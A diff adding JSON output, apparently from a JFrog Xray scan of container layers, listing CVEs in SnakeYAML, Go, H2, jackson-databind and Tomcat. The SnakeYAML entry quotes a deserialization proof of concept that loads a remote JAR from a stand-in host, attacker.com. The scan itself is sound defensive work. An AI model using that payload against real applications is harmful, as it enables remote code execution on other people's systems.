@@ -1,0 +1,840 @@
+{
+   "total_count": 12,
+   "data": [
+      {
+         "id": "XRAY-262821",
+         "severity": "Critical",
+         "severity_source": "CVSS V3 from NVD",
+         "pkg_type": "maven",
+         "summary": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "org.yaml:snakeyaml",
+         "source_id": "gav://org.yaml:snakeyaml",
+         "source_comp_id": "gav://org.yaml:snakeyaml:1.33",
+         "component_versions": {
+            "id": "org.yaml:snakeyaml",
+            "vulnerable_versions": [
+               "≤ 1.33"
+            ],
+            "fixed_versions": [
+               "2.0"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2022-1471",
+                     "cwe": [
+                        "CWE-502"
+                     ],
+                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                  }
+               ],
+               "description": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "2023-01-05T15:59:00Z",
+         "is_source_root": false,
+         "is_high_profile": true,
+         "high_profile_info": {
+            "Id": 0,
+            "PublicVulnsTblID": 0,
+            "VulnId": "XRAY-262821",
+            "VulnerabilityTitle": "",
+            "ShortDescription": "A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.",
+            "FullDescription": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",
+            "Impact": 7,
+            "VulnerabilityType": "Remote code execution",
+            "Resolution": "##### Development mitigations\n\nUse the (non-default) `SafeConstructor` class to initialize the `Yaml` class -\n```\nLoaderOptions options = new LoaderOptions();\nYaml yaml = new Yaml(new SafeConstructor(options));\nString strYaml = Files.readString(Path.of(\"input_file\")); \nString parsed = yaml.load(strYaml);\n```\n\nNote that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc.",
+            "ExtendedImpactReasons": [
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The issue has an exploit published",
+                  "Description": "PoC demonstrates remote code execution.",
+                  "IsPositive": 0,
+                  "InsertOrder": 4
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
+                  "Description": "An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.",
+                  "IsPositive": 1,
+                  "InsertOrder": 1
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The issue results in a severe impact (such as remote code execution)",
+                  "Description": "Remote code execution.",
+                  "IsPositive": 0,
+                  "InsertOrder": 2
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
+                  "Description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments.",
+                  "IsPositive": 0,
+                  "InsertOrder": 3
+               }
+            ],
+            "ExtendedReferences": [
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "RefType": "Patch",
+                  "Title": "Fixing commit",
+                  "Url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/2b8d47c8bcfd402e7a682b7b2674e8d0cb25e522",
+                  "InsertOrder": 1
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "RefType": "Advisory",
+                  "Title": "GitHub Advisory",
+                  "Url": "https://github.com/advisories/GHSA-mjmj-j48q-9wg2",
+                  "InsertOrder": 2
+               }
+            ],
+            "ExtendedRelatedVulns": null
+         },
+         "component_physical_paths": [
+            "sha256__2547a948987c670df3f6e9575f90adb629f64de0711765dee6fc4c615ee2d120.tar.gz/workspace/BOOT-INF/lib/snakeyaml-1.33.jar"
+         ]
+      },
+      {
+         "id": "XRAY-533052",
+         "severity": "Critical",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "Line directives (\"//line\") can be used to bypass the restrictions on \"//go:cgo_\" directives, allowing blocked linker and compiler flags to be passed during compilation. This can result in unexpected execution of arbitrary code when running \"go build\". The line directive requires the absolute path of the file in which the directive lives, which makes exploiting this issue significantly more complex.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.19.11",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.20.9",
+               "1.21.0-0 ≤ Version < 1.21.2"
+            ],
+            "fixed_versions": [
+               "1.20.9",
+               "1.21.2"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-39323",
+                     "cwe": [
+                        "NVD-CWE-noinfo"
+                     ],
+                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                  }
+               ],
+               "description": "Line directives (\"//line\") can be used to bypass the restrictions on \"//go:cgo_\" directives, allowing blocked linker and compiler flags to be passed during compilation. This can result in unexpected execution of arbitrary code when running \"go build\". The line directive requires the absolute path of the file in which the directive lives, which makes exploiting this issue significantly more complex.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__6b2f3c473f38b33b59e7b51e8ffd3e3e3a32137c664b8490b5699c243dd76ea4.tar.gz/cnb/lifecycle/launcher/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-533052",
+         "severity": "Critical",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "Line directives (\"//line\") can be used to bypass the restrictions on \"//go:cgo_\" directives, allowing blocked linker and compiler flags to be passed during compilation. This can result in unexpected execution of arbitrary code when running \"go build\". The line directive requires the absolute path of the file in which the directive lives, which makes exploiting this issue significantly more complex.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.20.5",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.20.9",
+               "1.21.0-0 ≤ Version < 1.21.2"
+            ],
+            "fixed_versions": [
+               "1.20.9",
+               "1.21.2"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-39323",
+                     "cwe": [
+                        "NVD-CWE-noinfo"
+                     ],
+                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+                  }
+               ],
+               "description": "Line directives (\"//line\") can be used to bypass the restrictions on \"//go:cgo_\" directives, allowing blocked linker and compiler flags to be passed during compilation. This can result in unexpected execution of arbitrary code when running \"go build\". The line directive requires the absolute path of the file in which the directive lives, which makes exploiting this issue significantly more complex.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__61e0cfcb6f3543ca620b2da9d5e475cb85dd48e92d82e119919ea667f4371a6c.tar.gz/layers/paketo-buildpacks_ca-certificates/helper/helper/github.com/golang/go",
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/github.com/golang/go",
+            "sha256__3f5f857a24121a63acf8e6415c9cec7790df50647a8bcb4e0f1278ece3826345.tar.gz/layers/paketo-buildpacks_spring-boot/helper/helper/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-533304",
+         "severity": "High",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly, as exploited in the wild in August through October 2023.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "golang.org/x/net",
+         "source_id": "go://golang.org/x/net",
+         "source_comp_id": "go://golang.org/x/net:0.11.0",
+         "component_versions": {
+            "id": "golang.org/x/net",
+            "vulnerable_versions": [
+               "< 0.17.0"
+            ],
+            "fixed_versions": [
+               "0.17.0"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-44487",
+                     "cwe": [
+                        "CWE-400"
+                     ],
+                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                  }
+               ],
+               "description": "The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly, as exploited in the wild in August through October 2023.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/golang.org/x/net"
+         ]
+      },
+      {
+         "id": "XRAY-261922",
+         "severity": "High",
+         "severity_source": "NVD",
+         "pkg_type": "maven",
+         "summary": "** DISPUTED ** The web-based admin console in H2 Database Engine through 2.1.214 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states \"This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that.\"",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "com.h2database:h2",
+         "source_id": "gav://com.h2database:h2",
+         "source_comp_id": "gav://com.h2database:h2:2.1.214",
+         "component_versions": {
+            "id": "com.h2database:h2",
+            "vulnerable_versions": [
+               "< 2.2.220"
+            ],
+            "fixed_versions": [
+               "2.2.220"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2022-45868",
+                     "cwe": [
+                        "CWE-200",
+                        "CWE-312"
+                     ],
+                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+                  }
+               ],
+               "description": "** DISPUTED ** The web-based admin console in H2 Database Engine through 2.1.214 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states \"This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that.\"",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "2023-01-08T19:24:00Z",
+         "is_source_root": false,
+         "is_high_profile": true,
+         "high_profile_info": {
+            "Id": 0,
+            "PublicVulnsTblID": 0,
+            "VulnId": "XRAY-261922",
+            "VulnerabilityTitle": "",
+            "ShortDescription": "(Non-issue) Incorrect usage of the H2 Database Engine may result in password leakage for the H2 Console.",
+            "FullDescription": "[h2database](https://github.com/h2database/h2database) is an open-source lightweight Java Database. H2 Database supports standard database APIs such as SQL and JDBC API. The H2 Database can also be used in embedded and server modes. H2 Database has a web-based admin console that can be initialized via the CLI. The console is accessible via tool options that are declared by the H2 Database. \n\nThe H2 console supports the `-webAdminPassword` CLI argument which takes the web admin password as a value. Specifying this password in the CLI is unsafe since local attackers will be able to see the password in plain text when the process list is shown with the arguments used to run them.\n\nThis vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
+            "Impact": 4,
+            "VulnerabilityType": "Local privilege escalation",
+            "Resolution": "",
+            "ExtendedImpactReasons": [
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The issue has been disputed by the vendor",
+                  "Description": "This vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
+                  "IsPositive": 1,
+                  "InsertOrder": 1
+               }
+            ],
+            "ExtendedReferences": [
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "RefType": "Technical Writeup",
+                  "Title": "Vulnerability report + technical writeup",
+                  "Url": "https://sites.google.com/sonatype.com/vulnerabilities/sonatype-2022-6243?pli=1",
+                  "InsertOrder": 1
+               }
+            ],
+            "ExtendedRelatedVulns": null
+         },
+         "component_physical_paths": [
+            "sha256__2547a948987c670df3f6e9575f90adb629f64de0711765dee6fc4c615ee2d120.tar.gz/workspace/BOOT-INF/lib/h2-2.1.214.jar"
+         ]
+      },
+      {
+         "id": "XRAY-531550",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "The html/template package does not properly handle HTML-like \"\" comment tokens, nor hashbang \"#!\" comment tokens, in <script> contexts. This may cause the template parser to improperly interpret the contents of <script> contexts, causing actions to be improperly escaped. This may be leveraged to perform an XSS attack.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.20.5",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.20.8",
+               "1.21.0-0 ≤ Version < 1.21.1"
+            ],
+            "fixed_versions": [
+               "1.20.8",
+               "1.21.1"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-39318",
+                     "cwe": [
+                        "CWE-79"
+                     ],
+                     "cvss_v3": "6.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                  }
+               ],
+               "description": "The html/template package does not properly handle HTML-like \"\" comment tokens, nor hashbang \"#!\" comment tokens, in <script> contexts. This may cause the template parser to improperly interpret the contents of <script> contexts, causing actions to be improperly escaped. This may be leveraged to perform an XSS attack.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__61e0cfcb6f3543ca620b2da9d5e475cb85dd48e92d82e119919ea667f4371a6c.tar.gz/layers/paketo-buildpacks_ca-certificates/helper/helper/github.com/golang/go",
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/github.com/golang/go",
+            "sha256__3f5f857a24121a63acf8e6415c9cec7790df50647a8bcb4e0f1278ece3826345.tar.gz/layers/paketo-buildpacks_spring-boot/helper/helper/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-522015",
+         "severity": "Medium",
+         "severity_source": "CVSS V3 from NVD",
+         "pkg_type": "maven",
+         "summary": "An issue was discovered jackson-databind thru 2.15.2 allows attackers to cause a denial of service or other unspecified impacts via crafted object that uses cyclic dependencies.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "com.fasterxml.jackson.core:jackson-databind",
+         "source_id": "gav://com.fasterxml.jackson.core:jackson-databind",
+         "source_comp_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.15.2",
+         "component_versions": {
+            "id": "com.fasterxml.jackson.core:jackson-databind",
+            "vulnerable_versions": [
+               "≤ 2.15.2"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-35116",
+                     "cwe": [
+                        "CWE-502"
+                     ],
+                     "cvss_v3": "4.7/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H"
+                  }
+               ],
+               "description": "An issue was discovered jackson-databind thru 2.15.2 allows attackers to cause a denial of service or other unspecified impacts via crafted object that uses cyclic dependencies.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": true,
+         "high_profile_info": {
+            "Id": 0,
+            "PublicVulnsTblID": 0,
+            "VulnId": "XRAY-522015",
+            "VulnerabilityTitle": "",
+            "ShortDescription": "(Non-Issue) Excessive recursion in Jackson-databind leads to denial of service when serializing untrusted Java objects.",
+            "FullDescription": "",
+            "Impact": 4,
+            "VulnerabilityType": "Unspecified",
+            "Resolution": "",
+            "ExtendedImpactReasons": [
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
+                  "Description": "",
+                  "IsPositive": 1,
+                  "InsertOrder": 1
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
+                  "Description": "The CVSS does not reflect the fact that the vulnerability was disputed.",
+                  "IsPositive": 1,
+                  "InsertOrder": 2
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The issue has been disputed by the vendor",
+                  "Description": "The vulnerable object cannot be serialized through Jackson APIs, making it extremely unlikely that such an object will be deserialized in a real-world scenario",
+                  "IsPositive": 1,
+                  "InsertOrder": 3
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "Name": "The issue has an exploit published",
+                  "Description": "A public crashing PoC was published.",
+                  "IsPositive": 0,
+                  "InsertOrder": 4
+               }
+            ],
+            "ExtendedReferences": [
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "RefType": "Exploit",
+                  "Title": "Proof of Concept",
+                  "Url": "https://github.com/FasterXML/jackson-databind/issues/3972#issue-1749290478",
+                  "InsertOrder": 1
+               },
+               {
+                  "Id": 0,
+                  "PublicVulnsExtendedTblId": 0,
+                  "RefType": "Advisory",
+                  "Title": "GitHub Issue",
+                  "Url": "https://github.com/FasterXML/jackson-databind/issues/3972",
+                  "InsertOrder": 2
+               }
+            ],
+            "ExtendedRelatedVulns": null
+         },
+         "component_physical_paths": [
+            "sha256__2547a948987c670df3f6e9575f90adb629f64de0711765dee6fc4c615ee2d120.tar.gz/workspace/BOOT-INF/lib/jackson-databind-2.15.2.jar"
+         ]
+      },
+      {
+         "id": "XRAY-523140",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "The HTTP/1 client does not fully validate the contents of the Host header. A maliciously crafted Host header can inject additional headers or entire requests. With fix, the HTTP/1 client now refuses to send requests containing an invalid Request.Host or Request.URL.Host value.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.20.5",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.19.11",
+               "1.20.0-0 ≤ Version < 1.20.6"
+            ],
+            "fixed_versions": [
+               "1.19.11",
+               "1.20.6"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-29406",
+                     "cwe": [
+                        "CWE-436"
+                     ],
+                     "cvss_v3": "6.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
+                  }
+               ],
+               "description": "The HTTP/1 client does not fully validate the contents of the Host header. A maliciously crafted Host header can inject additional headers or entire requests. With fix, the HTTP/1 client now refuses to send requests containing an invalid Request.Host or Request.URL.Host value.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__61e0cfcb6f3543ca620b2da9d5e475cb85dd48e92d82e119919ea667f4371a6c.tar.gz/layers/paketo-buildpacks_ca-certificates/helper/helper/github.com/golang/go",
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/github.com/golang/go",
+            "sha256__3f5f857a24121a63acf8e6415c9cec7790df50647a8bcb4e0f1278ece3826345.tar.gz/layers/paketo-buildpacks_spring-boot/helper/helper/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-527218",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "Extremely large RSA keys in certificate chains can cause a client/server to expend significant CPU time verifying signatures. With fix, the size of RSA keys transmitted during handshakes is restricted to <= 8192 bits. Based on a survey of publicly trusted RSA keys, there are currently only three certificates in circulation with keys larger than this, and all three appear to be test certificates that are not actively deployed. It is possible there are larger keys in use in private PKIs, but we target the web PKI, so causing breakage here in the interests of increasing the default safety of users of crypto/tls seems reasonable.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.20.5",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.19.12",
+               "1.20.0-0 ≤ Version < 1.20.7",
+               "1.21.0-0 ≤ Version < 1.21.0-rc.4"
+            ],
+            "fixed_versions": [
+               "1.19.12",
+               "1.20.7",
+               "1.21.0-rc.4"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-29409",
+                     "cwe": [
+                        "CWE-400"
+                     ],
+                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+                  }
+               ],
+               "description": "Extremely large RSA keys in certificate chains can cause a client/server to expend significant CPU time verifying signatures. With fix, the size of RSA keys transmitted during handshakes is restricted to <= 8192 bits. Based on a survey of publicly trusted RSA keys, there are currently only three certificates in circulation with keys larger than this, and all three appear to be test certificates that are not actively deployed. It is possible there are larger keys in use in private PKIs, but we target the web PKI, so causing breakage here in the interests of increasing the default safety of users of crypto/tls seems reasonable.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__61e0cfcb6f3543ca620b2da9d5e475cb85dd48e92d82e119919ea667f4371a6c.tar.gz/layers/paketo-buildpacks_ca-certificates/helper/helper/github.com/golang/go",
+            "sha256__133f79a6622aaa0495c72cc6a3b2e8bd35f7e5222ec86d7fea75f1563ee54a68.tar.gz/layers/paketo-buildpacks_bellsoft-liberica/helper/helper/github.com/golang/go",
+            "sha256__3f5f857a24121a63acf8e6415c9cec7790df50647a8bcb4e0f1278ece3826345.tar.gz/layers/paketo-buildpacks_spring-boot/helper/helper/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-527218",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "Extremely large RSA keys in certificate chains can cause a client/server to expend significant CPU time verifying signatures. With fix, the size of RSA keys transmitted during handshakes is restricted to <= 8192 bits. Based on a survey of publicly trusted RSA keys, there are currently only three certificates in circulation with keys larger than this, and all three appear to be test certificates that are not actively deployed. It is possible there are larger keys in use in private PKIs, but we target the web PKI, so causing breakage here in the interests of increasing the default safety of users of crypto/tls seems reasonable.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.19.11",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.19.12",
+               "1.20.0-0 ≤ Version < 1.20.7",
+               "1.21.0-0 ≤ Version < 1.21.0-rc.4"
+            ],
+            "fixed_versions": [
+               "1.19.12",
+               "1.20.7",
+               "1.21.0-rc.4"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-29409",
+                     "cwe": [
+                        "CWE-400"
+                     ],
+                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+                  }
+               ],
+               "description": "Extremely large RSA keys in certificate chains can cause a client/server to expend significant CPU time verifying signatures. With fix, the size of RSA keys transmitted during handshakes is restricted to <= 8192 bits. Based on a survey of publicly trusted RSA keys, there are currently only three certificates in circulation with keys larger than this, and all three appear to be test certificates that are not actively deployed. It is possible there are larger keys in use in private PKIs, but we target the web PKI, so causing breakage here in the interests of increasing the default safety of users of crypto/tls seems reasonable.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__6b2f3c473f38b33b59e7b51e8ffd3e3e3a32137c664b8490b5699c243dd76ea4.tar.gz/cnb/lifecycle/launcher/github.com/golang/go"
+         ]
+      },
+      {
+         "id": "XRAY-529034",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "maven",
+         "summary": "URL Redirection to Untrusted Site ('Open Redirect') vulnerability in FORM authentication feature Apache Tomcat.This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M10, from 10.1.0-M1 through 10.0.12, from 9.0.0-M1 through 9.0.79 and from 8.5.0 through 8.5.92.\n\nThe vulnerability is limited to the ROOT (default) web application.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "org.apache.tomcat.embed:tomcat-embed-core",
+         "source_id": "gav://org.apache.tomcat.embed:tomcat-embed-core",
+         "source_comp_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:10.1.12",
+         "component_versions": {
+            "id": "org.apache.tomcat.embed:tomcat-embed-core",
+            "vulnerable_versions": [
+               "10.1.0-M1 ≤ Version < 10.1.13",
+               "11.0.0-M1 ≤ Version < 11.0.0-M11",
+               "8.5.0 ≤ Version < 8.5.93",
+               "9.0.0-M1 ≤ Version < 9.0.80"
+            ],
+            "fixed_versions": [
+               "10.1.13",
+               "11.0.0-M11",
+               "8.5.93",
+               "9.0.80"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-41080",
+                     "cwe": [
+                        "CWE-601"
+                     ],
+                     "cvss_v3": "6.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                  }
+               ],
+               "description": "URL Redirection to Untrusted Site ('Open Redirect') vulnerability in FORM authentication feature Apache Tomcat.This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M10, from 10.1.0-M1 through 10.0.12, from 9.0.0-M1 through 9.0.79 and from 8.5.0 through 8.5.92.\n\nThe vulnerability is limited to the ROOT (default) web application.",
+               "provider": "JFrog"
+            }
+         },
+         "edited": "0001-01-01T00:00:00Z",
+         "is_source_root": false,
+         "is_high_profile": false,
+         "component_physical_paths": [
+            "sha256__2547a948987c670df3f6e9575f90adb629f64de0711765dee6fc4c615ee2d120.tar.gz/workspace/BOOT-INF/lib/tomcat-embed-core-10.1.12.jar"
+         ]
+      },
+      {
+         "id": "XRAY-531550",
+         "severity": "Medium",
+         "severity_source": "NVD",
+         "pkg_type": "go",
+         "summary": "The html/template package does not properly handle HTML-like \"\" comment tokens, nor hashbang \"#!\" comment tokens, in <script> contexts. This may cause the template parser to improperly interpret the contents of <script> contexts, causing actions to be improperly escaped. This may be leveraged to perform an XSS attack.",
+         "issue_type": "security",
+         "provider": "JFrog",
+         "component": "github.com/golang/go",
+         "source_id": "go://github.com/golang/go",
+         "source_comp_id": "go://github.com/golang/go:1.19.11",
+         "component_versions": {
+            "id": "github.com/golang/go",
+            "vulnerable_versions": [
+               "< 1.20.8",
+               "1.21.0-0 ≤ Version < 1.21.1"
+            ],
+            "fixed_versions": [
+               "1.20.8",
+               "1.21.1"
+            ],
+            "more_details": {
+               "cves": [
+                  {
+                     "cve": "CVE-2023-39318",
+                     "cwe": [
+                        "CWE-79"
+                     ],
+                     "cvss_v3": "6.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+                  }
+               ],
+               "description": "The html/template package does not properly handle HTML-like \"\" comment tokens, nor hashbang \"#!\" comment tokens, in <script> contexts. This may cause the template parser to improperly interpret the contents of <script> contexts, causing actions to be improperly escaped. This may be leveraged to perform an XSS attack.",
+               "provider": "JFrog"
+            }
+         },
